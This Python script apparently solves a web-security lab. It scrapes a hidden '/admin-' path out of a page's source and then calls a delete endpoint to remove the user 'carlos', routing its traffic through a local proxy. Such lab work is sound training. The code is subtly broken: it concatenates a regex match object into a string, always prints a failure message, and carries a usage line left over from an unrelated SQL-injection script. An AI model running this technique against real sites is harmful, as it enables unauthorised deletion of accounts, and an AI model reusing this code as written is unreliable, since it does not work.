# Lab 2: Unprotected admin functionality with unpredictable URL
import re
import sys

import requests
import urllib3
from bs4 import BeautifulSoup
from colorama import Fore

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def take_cookie():
    r = requests.get(url, verify=False, proxies=proxies, timeout=5)
    session_cookie = r.cookies.get("session")
    return session_cookie


def find_admin_path():
    r = requests.get(url, verify=False, proxies=proxies, timeout=5)
    soup = BeautifulSoup(r.text, "html.parser")
    admin_instance = soup.find(text=re.compile("/admin-"))
    admin_instance_str = str(admin_instance) if admin_instance is not None else ""
    admin_path = re.search(r"/(admin-.*)'", admin_instance_str)
    print(f"{Fore.GREEN}[+] Admin panel: {admin_path}{Fore.RESET}")
    return admin_path


def delete_carlos(cookie, admin_path):
    delete_command = "/delete?username=carlos"
    full_url = url + admin_path + delete_command
    print(full_url)
    cookies = {"session": cookie}
    r = requests.get(
        full_url, cookies=cookies, verify=False, proxies=proxies, timeout=5
    )
    r.raise_for_status()
    if r.status_code == 302:
        print(f"{Fore.GREEN}[-] Carlos deleted{Fore.RESET}")
    print(f"{Fore.RED}[-] Carlos not deleted{Fore.RESET}")


def exploit():
    cookie = take_cookie()
    admin_path = find_admin_path()
    delete_carlos(cookie, admin_path)


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"{Fore.RED}[-] Usage: {sys.argv[0]} <url>{Fore.RESET}")
        print(
            f'[-] Example: {sys.argv[0]} USER_NAME = "administrator" TABLE_NAME = "users" COLUMN_NAME = "username""'
        )
        sys.exit(-1)

    print("[*] Exploiting...")
    exploit()
